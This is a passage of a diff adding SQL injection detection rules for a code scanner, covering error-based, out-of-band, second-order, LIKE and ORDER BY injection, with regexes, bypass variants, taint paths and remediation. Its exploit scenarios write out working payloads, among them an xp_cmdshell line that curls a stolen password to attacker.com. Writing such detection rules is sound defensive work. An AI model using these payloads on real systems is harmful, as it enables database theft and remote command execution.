+    pattern: (?i)CAST\s*\(\s*\(SELECT\s+.*\)\s+AS\s+(?:int|numeric|decimal)\s*\)
+  - type: regex
+    pattern: (?i)EXP\s*\(\s*~\s*\(SELECT\s+
+  - type: regex
+    pattern: (?i)(?:AND|OR)\s+ROW\s*\(\s*[0-9]+\s*,\s*[0-9]+\s*\)\s*>\s*\(\s*SELECT\s+COUNT\s*\(\*\)
+  - type: regex
+    pattern: (?i)XMLTYPE\s*\(\s*CHR\s*\(
+  anti_patterns:
+  - -- test data
+  - -- migration
+  - CREATE\s+(?:OR\s+REPLACE\s+)?PROCEDURE
+  - CREATE\s+(?:OR\s+REPLACE\s+)?FUNCTION
+  - EXTRACTVALUE.*-- XML processing
+  - UPDATEXML.*-- XML update
+  - PreparedStatement
+  - parameterized
+  - cursor\.execute\(.*,\s*\(
+  - legitimate XML processing
+  - CAST.*-- type conversion
+  - CONVERT.*-- data migration
+  - -- unit test
+  - -- schema migration
+  - -- legitimate cast
+  bypass_variants:
+  - pattern: (?i)(?:AND|OR)\s+\(SELECT\s+1\s+FROM\s*\(\s*SELECT\s+COUNT\s*\(\*\)\s*,\s*CONCAT\s*\(\s*\(SELECT\s+
+    description: Double SELECT subquery with CONCAT for error-based extraction via duplicate entry error
+  - pattern: (?i)(?:AND|OR)\s+GTID_SUBSET\s*\(\s*CONCAT\s*\(
+    description: MySQL GTID_SUBSET function abuse for error message data leakage
+  - pattern: (?i)(?:AND|OR)\s+JSON_KEYS\s*\(\s*\(SELECT\s+CONCAT
+    description: MySQL JSON_KEYS type mismatch error for data extraction
+  evasion_indicators:
+  - using less common error-producing functions
+  - nested function calls to obfuscate intent
+  - CONCAT with hex-encoded separators
+  - double query (subquery in subquery) technique
+  - JSON function abuse for error generation
+  - GTID functions for MySQL-specific extraction
+  encoding_variants:
+  - 0x7e (tilde separator in CONCAT)
+  - CHAR(126) instead of ~
+  - hex-encoded table/column names in subquery
+  multi_function_chain_patterns:
+  - EXTRACTVALUE(1, CONCAT(0x7e, (SELECT ...))) (MySQL error extraction)
+  - CONVERT(int, (SELECT TOP 1 ...)) (SQL Server error extraction)
+  - CAST((SELECT ...) AS int) (PostgreSQL/general error extraction)
+  privilege_context_flags:
+  - SELECT privilege on target tables
+  - Error output must be visible to attacker (verbose error pages)
+  - No special privileges needed beyond SELECT
+  business_logic_indicator:
+  - Any endpoint that displays database error messages in response
+  - API endpoint returning error details in JSON response
+  - Debug mode enabled in production showing stack traces
+  probable_taint_paths:
+  - source: request.query.id
+    through: string concatenation
+    sink: cursor.execute() with error response to client
+  - source: request.body.search
+    through: template interpolation
+    sink: db.query() with unhandled exception
+  - source: URL parameter
+    through: format string
+    sink: Statement.executeQuery() with error page
+  context_awareness:
+    surrounding_context_patterns:
+    - WHERE\s+\w+\s*=\s*['"]?\{\{.*\}\}['"]?
+    - try.*catch.*(?:error|exception).*(?:message|detail|stack)
+    - res\.status\(500\)\.(?:json|send)\(
+    - error_reporting\s*\(\s*E_ALL
+    taint_source_indicators:
+    - request\.(?:params|query|body)\[
+    - \$_(?:GET|POST|REQUEST)\[
+    - HttpServletRequest\.getParameter\(
+    - req\.(?:body|query|params)
+    taint_sink_indicators:
+    - cursor\.execute\(
+    - connection\.query\(
+    - Statement\.executeQuery\(
+    - PDO::query\(
+    - db\.rawQuery\(
+    sanitization_patterns:
+    - parseInt\(
+    - intval\(
+    - prepared_statement
+    - custom error page
+    - generic error message
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: severity_weight * confidence * error_visibility_factor
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An attacker targets a search endpoint that displays SQL error messages. They inject: '' AND EXTRACTVALUE(1,
+      CONCAT(0x7e, (SELECT password FROM users WHERE username=''admin'')))--  The database returns an XPATH error containing
+      the admin password hash in the error message, enabling direct extraction without blind techniques.
+
+      '
+    example_payload: ''' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE username=''admin'')))--'
+    attacker_objective: Extract data directly from database error messages, providing faster exfiltration than blind techniques.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  impact: 'Error-based injection extracts data in bulk through crafted error messages,
+
+    significantly faster than blind techniques. When verbose error reporting is
+
+    enabled, attackers can extract entire table contents in a single request per
+
+    row. This technique is especially dangerous when combined with CONCAT to
+
+    aggregate multiple values.
+
+    '
+  remediation: "Parameterized Query Examples:\n\n  MySQL (PHP PDO):\n    $stmt = $pdo->prepare('SELECT * FROM products WHERE\
+    \ id = :id');\n    $stmt->execute(['id' => $productId]);\n\n  PostgreSQL (Node.js pg):\n    const result = await pool.query('SELECT\
+    \ * FROM products WHERE id = $1', [productId]);\n\nError Handling:\n  - Never display raw database error messages to users\n\
+    \  - Implement custom error pages with generic messages\n  - Log detailed errors server-side only\n  - Disable debug mode\
+    \ in production (DEBUG=false, error_reporting(0))\n\nWAF Rules:\n  - Block EXTRACTVALUE, UPDATEXML combined with CONCAT\n\
+    \  - Block CONVERT/CAST with subqueries in request parameters\n  - ModSecurity: SecRule ARGS \"@rx (?i)(extractvalue|updatexml)\\\
+    s*\\(\" \"id:1007,deny\"\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://portswigger.net/web-security/sql-injection
+  - https://owasp.org/www-community/attacks/SQL_Injection
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - SQL-INJ-001
+    - SQL-INJ-002
+    - SQL-INJ-003
+- rule_id: SQL-INJ-006
+  title: Out-of-Band SQL Injection
+  description: 'Detects out-of-band (OOB) SQL injection techniques that exfiltrate data through DNS lookups, HTTP requests,
+    or file system operations. Covers MySQL INTO OUTFILE/DUMPFILE, LOAD_FILE with UNC paths, SQL Server xp_cmdshell, Oracle
+    UTL_HTTP/UTL_INADDR, and PostgreSQL COPY TO PROGRAM. OOB techniques are used when in-band and blind channels are unavailable.
+
+    '
+  language: sql
+  category: injection
+  severity: High
+  confidence: 0.93
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - out-of-band
+  - file-write
+  - xp_cmdshell
+  - data-exfiltration
+  - dns-exfiltration
+  - utl_http
+  - load_file
+  detection_layer: 3
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: (?i)SELECT\s+.*INTO\s+(?:OUTFILE|DUMPFILE)\s+['"]
+  - type: regex
+    pattern: (?i)(?:EXEC|EXECUTE)\s+(?:xp_cmdshell|sp_configure)\s+
+  - type: regex
+    pattern: (?i)LOAD_FILE\s*\(\s*['"]\\\\\\\\[^'"]+
+  - type: regex
+    pattern: (?i)UTL_HTTP\.REQUEST\s*\(\s*['"]https?://.*\|\|
+  - type: regex
+    pattern: (?i)COPY\s+.*(?:FROM|TO)\s+PROGRAM\s+
+  - type: regex
+    pattern: (?i)UTL_INADDR\.GET_HOST_ADDRESS\s*\(\s*\(SELECT
+  - type: regex
+    pattern: (?i)LOAD_FILE\s*\(\s*CONCAT\s*\(\s*['"]\\\\\\\\[^'"]+['"]
+  - type: regex
+    pattern: (?i)OPENROWSET\s*\(\s*['"]SQLOLEDB['"]
+  anti_patterns:
+  - -- migration
+  - -- data export
+  - -- backup
+  - CREATE\s+(?:OR\s+REPLACE\s+)?PROCEDURE
+  - CREATE\s+(?:OR\s+REPLACE\s+)?FUNCTION
+  - COPY.*FROM.*CSV
+  - COPY.*TO.*STDOUT
+  - PreparedStatement
+  - parameterized
+  - xp_cmdshell.*-- disabled
+  - UTL_HTTP.*-- internal API
+  - LOAD_FILE.*-- config read
+  - INTO OUTFILE.*-- scheduled export
+  - -- administrative backup
+  - -- ETL pipeline
+  bypass_variants:
+  - pattern: (?i)(?:EXEC|EXECUTE)\s+(?:sp_OACreate|sp_OAMethod).*WScript\.Shell
+    description: SQL Server OLE automation for command execution when xp_cmdshell is disabled
+  - pattern: (?i)DBMS_SCHEDULER\.CREATE_JOB.*job_action\s*=>
+    description: Oracle DBMS_SCHEDULER for indirect OS command execution
+  - pattern: (?i)SELECT\s+.*INTO\s+(?:OUTFILE|DUMPFILE)\s+.*\.php
+    description: Writing a PHP webshell via INTO OUTFILE for persistent remote access
+  evasion_indicators:
+  - using alternative OOB channels (DNS vs HTTP)
+  - sp_OACreate as xp_cmdshell alternative
+  - DBMS_SCHEDULER instead of direct UTL_HTTP
+  - base64-encoded data in DNS subdomain labels
+  - writing to web-accessible directory for webshell
+  - using temporary tables as staging for file operations
+  encoding_variants:
+  - CHAR()-constructed file paths
+  - hex-encoded UNC paths
+  - CONCAT() for dynamic path construction
+  multi_function_chain_patterns:
+  - SELECT data -> CONCAT into DNS label -> UTL_INADDR.GET_HOST_ADDRESS (DNS exfil)
+  - xp_cmdshell 'certutil -encode' -> xp_cmdshell 'curl' (encode then exfil)
+  - SELECT INTO OUTFILE webshell -> HTTP access to webshell (write then execute)
+  privilege_context_flags:
+  - FILE privilege on MySQL for LOAD_FILE/INTO OUTFILE
+  - sysadmin role for xp_cmdshell on SQL Server
+  - EXECUTE on UTL_HTTP for Oracle OOB
+  - SUPERUSER for COPY FROM/TO PROGRAM on PostgreSQL
+  business_logic_indicator:
+  - Any endpoint with SQL injection where output is not reflected
+  - Asynchronous processing endpoints
+  - Endpoints behind WAF blocking in-band extraction
+  probable_taint_paths:
+  - source: request.query.id
+    through: SQL injection in WHERE clause
+    sink: database engine executing OOB function
+  - source: request.body.search
+    through: unparameterized query construction
+    sink: UTL_HTTP.REQUEST or xp_cmdshell
+  - source: URL parameter
+    through: string concatenation
+    sink: COPY TO PROGRAM
+  context_awareness:
+    surrounding_context_patterns:
+    - WHERE\s+\w+\s*=\s*['"]?\{\{.*\}\}['"]?
+    - EXEC\s+xp_
+    - UTL_HTTP
+    - INTO\s+OUTFILE
+    taint_source_indicators:
+    - request\.(?:params|query|body)\[
+    - \$_(?:GET|POST|REQUEST)\[
+    - HttpServletRequest\.getParameter\(
+    - req\.(?:body|query|params)
+    taint_sink_indicators:
+    - xp_cmdshell
+    - UTL_HTTP\.REQUEST
+    - LOAD_FILE
+    - INTO OUTFILE
+    - COPY.*PROGRAM
+    - OPENROWSET
+    sanitization_patterns:
+    - FILE privilege revoked
+    - xp_cmdshell disabled
+    - UTL_HTTP access restricted
+    - network egress filtering
+    - prepared_statement
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * oob_channel_availability
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An attacker exploits a blind SQL injection in a SQL Server application. Since error messages and timing
+      are unreliable, they use xp_cmdshell: ''; EXEC xp_cmdshell ''curl https://attacker.com/collect?data='' + (SELECT TOP
+      1 password FROM users)--  The database server makes an HTTP request to the attacker''s server with the extracted password
+      in the URL.
+
+      '
+    example_payload: '''; EXEC xp_cmdshell ''curl https://attacker.com/collect?data=''+CAST((SELECT TOP 1 password FROM users)
+      AS VARCHAR)--'
+    attacker_objective: Exfiltrate data through out-of-band channels (DNS, HTTP, file system) when in-band channels are blocked.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  impact: 'Out-of-band injection enables data exfiltration through DNS, HTTP, or file
+
+    system channels even when all in-band output is suppressed. File write
+
+    capabilities can deploy webshells for persistent RCE. xp_cmdshell and
+
+    COPY FROM PROGRAM provide direct OS command execution on the database server.
+
+    '
+  remediation: "Parameterized Query Examples:\n\n  SQL Server (C# Dapper):\n    connection.Execute(\"UPDATE profiles SET bio\
+    \ = @Bio WHERE user_id = @UserId\", new { Bio = bioInput, UserId = userId });\n\n  Oracle (Java JDBC):\n    PreparedStatement\
+    \ stmt = conn.prepareStatement(\"SELECT * FROM products WHERE id = ?\");\n    stmt.setInt(1, productId);\n\nDatabase Hardening:\n\
+    \  - Disable xp_cmdshell: EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE\n  - Revoke FILE privilege on MySQL\n  - Revoke\
+    \ EXECUTE on UTL_HTTP, UTL_INADDR, DBMS_SCHEDULER for application accounts\n  - Restrict COPY FROM/TO PROGRAM for application\
+    \ roles on PostgreSQL\n  - Implement network egress filtering to block database server outbound connections\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
+  - https://owasp.org/www-community/attacks/SQL_Injection
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: flow-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - SQL-INJ-004
+    - SQL-INJ-003
+    - SQL-INJ-001
+- rule_id: SQL-INJ-007
+  title: Second-Order SQL Injection via Stored Data
+  description: 'Detects second-order SQL injection patterns where malicious input is stored safely in the database but later
+    retrieved and used unsafely in dynamic SQL construction. Covers stored procedures that build queries from table data,
+    user profile fields used in subsequent queries, and data-driven query construction patterns where previously stored values
+    are concatenated into SQL without parameterization.
+
+    '
+  language: sql
+  category: injection
+  severity: High
+  confidence: 0.78
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - second-order
+  - stored-procedure
+  - data-driven-query
+  - delayed-injection
+  - persistent-injection
+  detection_layer: 3
+  attack_surface_type: internal
+  patterns:
+  - type: regex
+    pattern: (?i)SET\s+@\w*(?:sql|query)\w*\s*=\s*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^']*['"]\s*\+\s*@
+  - type: regex
+    pattern: (?i)EXEC(?:UTE)?\s*\(\s*@\w*(?:sql|query|cmd|stmt)\w*\s*\+\s*
+  - type: regex
+    pattern: (?i)EXECUTE\s+IMMEDIATE\s+\w*(?:sql|query|stmt)\w*\s*\|\|
+  - type: regex
+    pattern: (?i)PREPARE\s+\w+\s+FROM\s+@\w*(?:sql|query|input)
+  - type: regex
+    pattern: (?i)(?:sql|query|stmt)\w*\s*=\s*['"]SELECT\b.*['"]\s*\+\s*(?:row|record|result|data)\[
+  - type: regex
+    pattern: (?i)(?:sql|query)\w*\s*=\s*f['"]SELECT\b.*\{(?:row|record|result|stored|data)\[
+  - type: regex
+    pattern: (?i)DBMS_SQL\.PARSE\s*\(.*\|\|
+  anti_patterns:
+  - sp_executesql.*@param
+  - USING
+  - sp_executesql\s+.*,\s*N'@\w+\s+\w+'
+  - EXECUTE\s+IMMEDIATE.*USING\s+\w+
+  - DBMS_SQL\.BIND_VARIABLE
+  - PREPARE.*EXECUTE.*USING
+  - EntityFramework.*FromSqlInterpolated
+  - ActiveRecord::Base\.sanitize_sql
+  - QueryBuilder\.
+  - CriteriaBuilder
+  - PreparedStatement
+  - conn\.prepare\(
+  - cursor\.execute\(.*,\s*\(
+  - connection\.query\(.*,\s*\[
+  - parameterized
+  bypass_variants:
+  - pattern: (?i)INSERT\s+INTO\s+\w+.*VALUES\s*\(.*['"].*(?:UNION|SELECT|DROP|OR\s+1=1).*['"]
+    description: Payload stored via INSERT that triggers on subsequent SELECT with concatenation
+  - pattern: (?i)UPDATE\s+\w+\s+SET\s+\w+\s*=\s*['"].*(?:;|UNION|DROP).*['"]\s+WHERE
+    description: Malicious value stored via UPDATE, exploited when field is later used in dynamic SQL
+  - pattern: (?i)(?:username|display_name|title|bio)\s*=\s*['"].*(?:'|;|UNION|SELECT).*['"]
+    description: SQL metacharacters stored in user profile fields for delayed exploitation
+  evasion_indicators:
+  - injection payload stored in a different request than exploitation
+  - time delay between storage and execution
+  - payload in user-editable profile fields
+  - stored in one table, exploited via join or lookup
+  - batch/cron job triggers the second-order execution
+  - admin panel query uses stored user input
+  encoding_variants:
+  - HTML-encoded SQL in stored field
+  - unicode-escaped SQL keywords
+  - base64-encoded payload decoded at retrieval
+  multi_function_chain_patterns:
+  - INSERT (safe storage) -> SELECT into variable -> EXEC dynamic SQL (exploitation)
+  - UPDATE profile -> admin report query using profile field (delayed trigger)
+  - User registration -> background job building query from user data (async trigger)
+  privilege_context_flags:
+  - INSERT/UPDATE privilege to store payload
+  - Stored procedure execution privilege for trigger
+  - The exploited query runs with the SP owner's privileges
+  business_logic_indicator:
+  - User registration with username or display name
+  - Profile update fields used in reports or admin queries
+  - Data import/export pipelines using stored values
+  - Audit log queries using stored user-supplied descriptions
+  probable_taint_paths:
+  - source: registration form username field
+    through: safe INSERT, then unsafe SELECT into dynamic SQL
+    sink: EXEC(@sql) in stored procedure
+  - source: profile bio field
+    through: stored in profiles table, retrieved by admin report
+    sink: EXECUTE IMMEDIATE with concatenation
+  - source: comment text
+    through: stored safely, used in search indexing query
+    sink: cursor.execute(f'...')
+  context_awareness:
+    surrounding_context_patterns:
+    - SET\s+@\w+\s*=\s*.*\+\s*@(?!\w*param)
+    - DECLARE\s+@\w*(?:sql|query|stmt)
+    - (?:sql|query)\w*\s*(?:\+=|=\s*.*\+)
+    - SELECT\s+\w+\s+INTO\s+@\w+\s+FROM
+    taint_source_indicators:
+    - stored procedure parameter from table lookup
+    - SELECT INTO variable FROM user-editable table
+    - cursor.fetchone() result used in query
+    - row['username'] or result.username
+    taint_sink_indicators:
+    - EXEC(?:UTE)?\s*\(
+    - EXECUTE\s+IMMEDIATE
+    - sp_executesql
+    - cursor\.execute\(
+    - connection\.query\(
+    - DBMS_SQL\.EXECUTE
+    sanitization_patterns:
+    - sp_executesql\s+.*,\s*N'@
+    - USING\s+\w+
+    - DBMS_SQL\.BIND_VARIABLE
+    - PreparedStatement
+    - parameterized
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * stored_data_trust_factor
+    exploitability_score: Medium
+  exploit_scenario:
+    attack_example: 'An attacker registers with username: admin''-- During registration, the username is safely parameterized
+      in the INSERT. Later, a password reset stored procedure does: SET @sql = ''UPDATE users SET password = '''''' + @newPass
+      + '''''' WHERE username = '''''' + @storedUsername + ''''''''; EXEC(@sql). The stored username breaks out of the string
+      context, allowing the attacker to change the admin password.
+
+      '
+    example_payload: admin'--
+    attacker_objective: Store malicious SQL fragments that execute when the application later uses stored data in dynamic
+      SQL construction.
+  confidence_factors:
+    pattern_strength: medium
+    context_match: medium
+    proximity_to_user_input: medium
+    sanitization_absence: high
+  impact: 'Second-order injection is particularly dangerous because the initial storage
+
+    is safe, making detection at the input boundary insufficient. The payload
+
+    executes in a different context, often with elevated privileges (stored
+
+    procedure owner context). This can lead to privilege escalation, data
+
+    corruption, and authentication bypass.
+
+    '
+  remediation: "Parameterized Query Examples:\n\n  SQL Server (T-SQL sp_executesql):\n    EXEC sp_executesql N'UPDATE users\
+    \ SET password = @pass WHERE username = @user',\n      N'@pass NVARCHAR(100), @user NVARCHAR(50)', @pass = @newPass, @user\
+    \ = @storedUsername;\n\n  PostgreSQL (PL/pgSQL EXECUTE USING):\n    EXECUTE 'UPDATE users SET password = $1 WHERE username\
+    \ = $2' USING p_new_pass, p_stored_username;\n\nPrevention:\n  - Parameterize ALL queries, including those using data\
+    \ retrieved from the database\n  - Never trust stored data any more than user input\n  - Use query builders or ORM methods\
+    \ for all database operations\n  - Audit stored procedures for dynamic SQL construction from table data\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://portswigger.net/web-security/sql-injection/second-order
+  - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: flow-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - SQL-INJ-004
+    - SQL-INJ-001
+    - SQL-INJ-010
+- rule_id: SQL-INJ-008
+  title: LIKE Injection with Wildcard Abuse
+  description: 'Detects SQL injection through LIKE clause manipulation where user input containing wildcard characters (%,
+    _) is not properly escaped. Attackers can inject % to match all records (data exfiltration), craft expensive LIKE patterns
+    for ReDoS-style denial-of-service, or combine LIKE with SQL injection techniques to bypass authentication filters.
+
+    '
+  language: sql
+  category: injection
+  severity: Medium
+  confidence: 0.82
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - like-injection
+  - wildcard-abuse
+  - data-exfiltration
+  - dos
+  - search-bypass
+  - pattern-matching
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: (?i)LIKE\s+['"]%['"]
+  - type: regex
+    pattern: (?i)LIKE\s+['"]%%['"]
+  - type: regex
+    pattern: (?i)WHERE\s+\w+\s+LIKE\s+['"]%\s*\{\{.*\}\}\s*%['"]
+  - type: regex
+    pattern: (?i)LIKE\s+CONCAT\s*\(\s*['"]%['"].*\$
+  - type: regex
+    pattern: (?i)WHERE\s+\w+\s+LIKE\s+['"](?:%_){5,}['"]
+  - type: regex
+    pattern: (?i)OR\s+\w+\s+LIKE\s+['"]%['"]
+  - type: regex
+    pattern: (?i)LIKE\s+['"]%(?:admin|root|password|secret)%['"]
+  anti_patterns:
+  - ESCAPE\s+['"]\\\\['"]
+  - ESCAPE clause
+  - sanitize_like
+  - escape_wildcards
+  - -- full text search
+  - MATCH.*AGAINST
+  - to_tsvector
+  - parameterized
+  - PreparedStatement
+  - -- search feature
+  - LIKE\s+CONCAT\s*\(\s*['"]%['"].*\?\s*,
+  - -- migration
+  - -- test data
+  - legitimate search
+  bypass_variants:
+  - pattern: (?i)LIKE\s+CHAR\s*\(\s*37\s*\)
+    description: Using CHAR(37) to inject % wildcard, bypassing literal percent sign filters
+  - pattern: (?i)LIKE\s+['"]_____['"]
+    description: Using underscore wildcards to match specific-length values for enumeration
+  - pattern: (?i)LIKE\s+['"]%['"](?:\s+ESCAPE\s+['"][^\\\\]['"])
+    description: Custom ESCAPE character that does not actually escape wildcards
+  evasion_indicators:
+  - CHAR() function for wildcard injection
+  - underscore patterns for length-based enumeration
+  - custom ESCAPE clause that does not neutralize wildcards
+  - Unicode-encoded wildcard characters
+  - combining LIKE with OR for tautology
+  - nested LIKE in subquery
+  encoding_variants:
+  - CHAR(37) for %
+  - CHAR(95) for _
+  - '%25 (URL-encoded %)'
+  multi_function_chain_patterns:
+  - LIKE '%' (match all) -> LIKE '%admin%' (target search)
+  - LIKE '____' (enumerate 4-char values) -> LIKE 'adm_' (narrow down)
+  - WHERE x LIKE '%' OR 1=1 (LIKE as authentication bypass vector)
+  privilege_context_flags:
+  - SELECT privilege on searchable tables
+  - No elevated privileges needed
+  - Full table scan impact on large tables
+  business_logic_indicator:
+  - Search endpoints with text input
+  - Autocomplete/typeahead APIs
+  - Filter endpoints with pattern matching
+  - Admin panel user search functionality
+  probable_taint_paths:
+  - source: request.query.search
+    through: CONCAT('%', input, '%') without wildcard escaping
+    sink: cursor.execute()
+  - source: request.body.filter
+    through: template interpolation into LIKE clause
+    sink: db.query()
+  - source: search bar input
+    through: string concatenation
+    sink: Statement.executeQuery()
+  context_awareness:
+    surrounding_context_patterns:
+    - WHERE\s+\w+\s+LIKE\s+
+    - LIKE\s+CONCAT\s*\(
+    - search.*query.*LIKE
+    - filter.*LIKE
+    taint_source_indicators:
+    - request\.query\.(?:search|q|query|filter)
+    - \$_GET\[.(?:search|q|query).\]
+    - params\.get\(.(?:search|q).\)
+    - searchInput
+    taint_sink_indicators:
+    - LIKE\s+CONCAT
+    - LIKE\s+['"]%
+    - cursor\.execute\(
+    - connection\.query\(
+    sanitization_patterns:
+    - ESCAPE\s+['"]\\\\['"]
+    - escape_wildcards\(
+    - replace.*%
+    - sanitize_like\(
+    - MATCH AGAINST
+  severity_scoring:
+    severity_weight: 5
+    risk_score_formula_hint: severity_weight * confidence * data_exposure_factor
+    exploitability_score: Medium
+  exploit_scenario:
+    attack_example: 'An attacker discovers a user search endpoint at /api/users?q=john that constructs: SELECT * FROM users
+      WHERE name LIKE ''%'' + input + ''%''. Submitting q=% returns all users. Submitting q=%admin% reveals admin accounts.
+      Submitting q=%'' OR ''1''=''1 bypasses the LIKE and returns all records. Repeated requests with q=a%, q=b%, etc. enumerate
+      all usernames character by character.
+
+      '
+    example_payload: '%'' OR ''1''=''1'
+    attacker_objective: Exfiltrate data by manipulating LIKE wildcards, enumerate values through prefix/suffix searching,
+      or cause DoS through expensive pattern matching.
+  confidence_factors:
+    pattern_strength: medium
+    context_match: medium
+    proximity_to_user_input: high
+    sanitization_absence: medium
+  impact: 'LIKE injection enables data enumeration through wildcard manipulation,
+
+    authentication bypass via tautology construction, and denial-of-service
+
+    through expensive pattern matching on large tables. While less severe than
+
+    full SQL injection, it can expose significant amounts of data through
+
+    iterative searching.
+
+    '
+  remediation: "Parameterized Query with ESCAPE:\n\n  PostgreSQL:\n    cursor.execute(\"SELECT * FROM users WHERE name LIKE\
+    \ '%' || $1 || '%' ESCAPE '\\\\'\", [escaped_input])\n    -- Pre-processing: escaped_input = input.replace('%', '\\\\\
+    %').replace('_', '\\\\_')\n\n  MySQL:\n    cursor.execute(\"SELECT * FROM users WHERE name LIKE CONCAT('%', %s, '%') ESCAPE\
+    \ '\\\\\\\\'\", [escaped_input])\n\nPrevention:\n  - Always escape % and _ in user input before LIKE clauses\n  - Use\
+    \ ESCAPE clause to define escape character\n  - Use full-text search (MATCH AGAINST, to_tsvector) instead of LIKE for\
+    \ search features\n  - Implement result set limits (LIMIT, TOP) on search queries\n  - Rate-limit search endpoints to\
+    \ prevent enumeration\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://owasp.org/www-community/attacks/SQL_Injection
+  - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+  cross_rule_intelligence:
+    cross_file_risk_flag: false
+    requires_ai_validation: true
+    high_impact_flag: false
+    related_rules:
+    - SQL-INJ-001
+    - SQL-INJ-002
+    - SQL-INJ-009
+- rule_id: SQL-INJ-009
+  title: ORDER BY Injection
+  description: 'Detects SQL injection through ORDER BY clauses where user-supplied column names, sort directions, or numeric
+    indices are incorporated without validation. Since column identifiers cannot be parameterized, ORDER BY clauses are a
+    common injection vector. Attackers leverage this for column count enumeration, boolean-based data inference via conditional
+    ordering, and full SQL injection through subquery or CASE WHEN constructs.
+
+    '
+  language: sql
+  category: injection
+  severity: High
+  confidence: 0.85
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - order-by-injection
+  - column-enumeration
+  - sort-parameter
+  - dynamic-ordering
+  - data-inference
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: (?i)ORDER\s+BY\s+\d{2,}\s*(?:--|#|\/\*)
+  - type: regex
+    pattern: (?i)ORDER\s+BY\s+(?:CASE\s+WHEN|IF\s*\()
+  - type: regex
+    pattern: (?i)ORDER\s+BY\s+\(SELECT\s+
+  - type: regex
+    pattern: (?i)ORDER\s+BY\s+\w+\s*(?:--|#|\/\*)
+  - type: regex
+    pattern: (?i)ORDER\s+BY\s+RAND\s*\(\s*(?:SELECT|IF|CASE)
+  - type: regex
+    pattern: (?i)(?:sort|order|sortby|orderby)\s*=\s*[^&]*(?:--|#|\/\*|CASE\s+WHEN|SELECT)
+  - type: regex
+    pattern: (?i)ORDER\s+BY\s+\w+\s*,\s*\(SELECT
+  anti_patterns:
+  - ORDER BY created_at
+  - ORDER BY id
+  - ORDER BY name
+  - QUOTENAME
+  - whitelist
+  - allowedColumns
+  - sortableColumns
+  - PreparedStatement
+  - parameterized
+  - -- pagination
+  - ORDER\s+BY\s+\?\s+
+  - validSortColumns
+  - -- default sort
+  - legitimate ordering
+  - -- migration
+  bypass_variants:
+  - pattern: (?i)ORDER\s+BY\s+\(SELECT\s+CASE\s+WHEN\s+\(SELECT\s+SUBSTRING.*\)\s*=\s*.*THEN\s+\w+\s+ELSE\s+\w+\s+END\)
+    description: Conditional ORDER BY with subquery for boolean-based blind data extraction via sort order
+  - pattern: (?i)ORDER\s+BY\s+IF\s*\(\s*\(SELECT.*\)\s*,\s*\w+\s*,\s*\w+\s*\)
+    description: MySQL IF() in ORDER BY for conditional sorting based on extracted data
+  - pattern: (?i)ORDER\s+BY\s+UPDATEXML\s*\(
+    description: Error-based injection within ORDER BY via UPDATEXML for direct data extraction
+  evasion_indicators:
+  - numeric column index instead of column name
+  - CASE WHEN in ORDER BY for conditional sorting
+  - subquery in ORDER BY clause
+  - RAND() with conditional seed for boolean inference
+  - error-producing functions in ORDER BY
+  - multiple chained ORDER BY values
+  encoding_variants:
+  - URL-encoded sort parameters
+  - CHAR() for column name construction
+  - hex-encoded values in CASE expressions
+  multi_function_chain_patterns:
+  - ORDER BY 1 -> ORDER BY 2 -> ... (column count discovery)
+  - ORDER BY CASE WHEN condition THEN col1 ELSE col2 END (boolean inference)
+  - ORDER BY (SELECT ...) (subquery-based extraction)
+  privilege_context_flags:
+  - SELECT privilege on target tables
+  - No special privileges needed
+  - Subquery execution privilege for nested SELECT
+  business_logic_indicator:
+  - Data listing with sort parameter in URL
+  - Table view with sortable columns
+  - API endpoint accepting sort/order query parameters
+  - Admin panel listing with configurable sorting
+  probable_taint_paths:
+  - source: request.query.sort
+    through: direct concatenation into ORDER BY clause
+    sink: cursor.execute()
+  - source: request.query.orderBy
+    through: string interpolation
+    sink: db.query()
+  - source: URL sort parameter
+    through: format string in SQL
+    sink: Statement.executeQuery()
+  context_awareness:
+    surrounding_context_patterns:
+    - ORDER\s+BY\s+.*\+.*(?:req|request|params|input)
+    - sort\w*\s*=\s*(?:req|request|params)\.
